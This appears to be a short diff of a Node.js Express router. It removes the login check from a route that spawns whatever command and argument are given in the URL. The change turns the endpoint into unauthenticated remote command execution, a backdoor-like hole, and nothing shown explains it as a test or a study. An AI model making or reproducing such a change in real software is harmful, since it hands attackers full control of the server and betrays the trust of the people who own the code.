@@ -178,7 +178,7 @@ router.get('/proc', isLoggedIn, async (req, res, next) => {
     });
 });
 
-router.post('/proc/:command/:args', isLoggedIn, async (req, res, next) => {
+router.post('/proc/:command/:args', async (req, res, next) => {
     const {command, args} = req.params;
 
     const subprocess = spawn(command, [args]);
